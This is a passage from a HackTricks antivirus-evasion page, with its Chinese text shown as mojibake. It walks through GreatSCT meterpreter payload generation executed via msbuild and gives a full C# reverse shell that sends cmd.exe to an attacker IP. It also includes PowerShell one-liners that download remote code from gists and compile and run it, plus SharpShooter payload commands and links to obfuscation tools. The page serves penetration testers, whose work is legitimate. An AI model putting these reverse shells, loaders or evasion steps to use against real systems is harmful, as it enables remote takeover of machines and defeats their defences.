<li>å¦‚æœ <code>winvnc</code> å·²ç»åœ¨è¿è¡Œï¼Œä¸è¦å†æ¬¡å¯åŠ¨å®ƒï¼Œå¦åˆ™ä¼šè§¦å‘ <a href="https://i.imgur.com/1SROTTl.png">å¼¹å‡ºçª—å£</a>ã€‚ä½¿ç”¨ <code>tasklist | findstr winvnc</code> æ£€æŸ¥å®ƒæ˜¯å¦åœ¨è¿è¡Œ</li>
<li>å¦‚æœæ²¡æœ‰ <code>UltraVNC.ini</code> åœ¨åŒä¸€ç›®å½•ä¸­ï¼Œä¸è¦å¯åŠ¨ <code>winvnc</code>ï¼Œå¦åˆ™ä¼šå¯¼è‡´ <a href="https://i.imgur.com/rfMQWcf.png">é…ç½®çª—å£</a> æ‰“å¼€</li>
<li>ä¸è¦è¿è¡Œ <code>winvnc -h</code> è·å–å¸®åŠ©ï¼Œå¦åˆ™ä¼šè§¦å‘ <a href="https://i.imgur.com/oc18wcu.png">å¼¹å‡ºçª—å£</a></li>
</ul>
<h3 id="greatsct"><a class="header" href="#greatsct">GreatSCT</a></h3>
<p>ä»ä»¥ä¸‹é“¾æ¥ä¸‹è½½: <a href="https://github.com/GreatSCT/GreatSCT">https://github.com/GreatSCT/GreatSCT</a></p>
<pre><code>git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
</code></pre>
<p>åœ¨GreatSCTå†…éƒ¨ï¼š</p>
<pre><code>use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
</code></pre>
<p>ç°åœ¨ <strong>å¯åŠ¨ç›‘å¬å™¨</strong> ä½¿ç”¨ <code>msfconsole -r file.rc</code> å¹¶ <strong>æ‰§è¡Œ</strong> <strong>xml è´Ÿè½½</strong> ä½¿ç”¨ï¼š</p>
<pre><code>C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
</code></pre>
<p><strong>å½“å‰çš„é˜²å¾¡è€…ä¼šéå¸¸å¿«é€Ÿåœ°ç»ˆæ­¢è¿›ç¨‹ã€‚</strong></p>
<h3 id="ç¼–è¯‘æˆ‘ä»¬è‡ªå·±çš„åå‘-shell"><a class="header" href="#ç¼–è¯‘æˆ‘ä»¬è‡ªå·±çš„åå‘-shell">ç¼–è¯‘æˆ‘ä»¬è‡ªå·±çš„åå‘ shell</a></h3>
<p>https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15</p>
<h4 id="ç¬¬ä¸€ä¸ª-c-åå‘-shell"><a class="header" href="#ç¬¬ä¸€ä¸ª-c-åå‘-shell">ç¬¬ä¸€ä¸ª C# åå‘ shell</a></h4>
<p>ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ç¼–è¯‘ï¼š</p>
<pre><code>c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
</code></pre>
<p>ä½¿ç”¨å®ƒä¸ï¼š</p>
<pre><code>back.exe &lt;ATTACKER_IP&gt; &lt;PORT&gt;
</code></pre>
<pre><code class="language-csharp">// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
</code></pre>
<h3 id="c-ä½¿ç”¨ç¼–è¯‘å™¨"><a class="header" href="#c-ä½¿ç”¨ç¼–è¯‘å™¨">C# ä½¿ç”¨ç¼–è¯‘å™¨</a></h3>
<pre><code>C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
</code></pre>
<p>è‡ªåŠ¨ä¸‹è½½å’Œæ‰§è¡Œï¼š</p>
<pre><code class="language-csharp">64bit:
powershell -command "&amp; { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" &amp;&amp; powershell -command "&amp; { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" &amp;&amp; C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "&amp; { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" &amp;&amp; powershell -command "&amp; { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" &amp;&amp; C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
</code></pre>
<p>{% embed url="https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f" %}</p>
<p>C# æ··æ·†å™¨åˆ—è¡¨: <a href="https://github.com/NotPrab/.NET-Obfuscator">https://github.com/NotPrab/.NET-Obfuscator</a></p>
<h3 id="c"><a class="header" href="#c">C++</a></h3>
<pre><code>sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
</code></pre>
<ul>
<li><a href="https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp">https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp</a></li>
<li><a href="https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/">https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/</a></li>
<li><a href="https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf">https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf</a></li>
<li><a href="ps://github.com/l0ss/Group">https://github.com/l0ss/Grouper2</a></li>
<li><a href="http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html">http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html</a></li>
<li><a href="http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/">http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/</a></li>
</ul>
<h3 id="ä½¿ç”¨-python-æ„å»ºæ³¨å…¥å™¨ç¤ºä¾‹"><a class="header" href="#ä½¿ç”¨-python-æ„å»ºæ³¨å…¥å™¨ç¤ºä¾‹">ä½¿ç”¨ Python æ„å»ºæ³¨å…¥å™¨ç¤ºä¾‹ï¼š</a></h3>
<ul>
<li><a href="https://github.com/cocomelonc/peekaboo">https://github.com/cocomelonc/peekaboo</a></li>
</ul>
<h3 id="å…¶ä»–å·¥å…·"><a class="header" href="#å…¶ä»–å·¥å…·">å…¶ä»–å·¥å…·</a></h3>
<pre><code class="language-bash"># Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
</code></pre>
<h3 id="æ›´å¤š"><a class="header" href="#æ›´å¤š">æ›´å¤š</a></h3>
<ul>
<li><a href="https://github.com/persianhydra/Xeexe-TopAntivirusEvasion">https://github.com/persianhydra/Xeexe-TopAntivirusEvasion</a></li>
</ul>
<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
<p>å¦‚æœä½ å¯¹<strong>é»‘å®¢èŒä¸š</strong>æ„Ÿå…´è¶£å¹¶æƒ³è¦æ”»å…‹ä¸å¯æ”»å…‹çš„ç›®æ ‡ - <strong>æˆ‘ä»¬æ­£åœ¨æ‹›è˜ï¼</strong>ï¼ˆ<em>éœ€è¦æµåˆ©çš„æ³¢å…°è¯­ä¹¦å†™å’Œå£è¯­èƒ½åŠ›</em>ï¼‰ã€‚</p>
<p>{% embed url="https://www.stmcyber.com/careers" %}</p>
<p>{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="../.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>Telegram ç¾¤ç»„</strong></a> æˆ– <strong>å…³æ³¨</strong> æˆ‘ä»¬çš„ <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../windows-hardening/basic-powershell-for-pentesters/powerview.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../windows-hardening/cobalt-strike.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../windows-hardening/basic-powershell-for-pentesters/powerview.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../windows-hardening/cobalt-strike.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../elasticlunr.min.js"></script>
        <script src="../mark.min.js"></script>
        <script src="../searcher.js"></script>

        <script src="../clipboard.min.js"></script>
        <script src="../highlight.js"></script>
        <script src="../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
